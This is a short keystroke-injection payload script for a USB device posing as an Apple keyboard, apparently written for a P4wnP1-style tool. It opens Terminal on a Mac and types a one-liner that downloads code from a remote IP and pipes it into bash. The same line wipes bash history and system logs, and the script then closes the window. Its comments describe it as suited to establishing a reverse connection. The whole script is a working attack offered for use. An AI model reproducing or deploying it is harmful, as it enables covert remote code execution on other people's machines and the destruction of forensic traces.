// Name: DnExBye-Mac.js
// Mac OS HID attack that opens a bash terminal, downloads file, executes file, does NOT save file to disk.
// (good for establishing reverse connection)

// author: Carey James - Mac Help Nashville

// Don't forget to emulate a mac keyboard first in USB Gadget Settings:
// Apple Magic Keyboard A1644
// 0x05AC (VID)
// 0x0267 (PID)
// and a valid serial number for you: F0T536302K7G9KPAS

layout("us"); //language layout
//typingSpeed(0,0); //type as fast as possible

press("WIN SPACEBAR");	        // WIN + SPACEBAR, to open spotlight search (it obviously does not know about Mac's COMMAND key)
delay(400);             // wait 200ms
type("terminal.app\n"); 	// type 'terminal.app' to the run dialog, append a RETURN
delay(400);            // wait for terminal to come up
press("WIN t"); 	// in case terminal is open, it gives us a fresh tab

delay(400);            // 
// Type the one-liner command into terminal, execute, append a RETURN
// opens a bash terminal, downloads file, executes file, does NOT save file to disk.
type("curl -s http://xxx.xx.xxx.xx/file | bash | rm -r ~/.bash_history ~/Library/Logs/*\n");
delay(400);            // 
// close terminal after LED change
//waitLEDRepeat(ANY);     // wait for a single LED change
press("WIN w");        // WIN + w shortcut to close window
delay(200);             // wait 200ms
press("RETURN");        // confirm close window
//delay(200);             // wait 200ms
//press("WIN w");        // WIN + w Again in case they did not have terminal open and we opened 2 tabs
//delay(200);             // wait 200ms
//press("RETURN");        // confirm close 2nd window
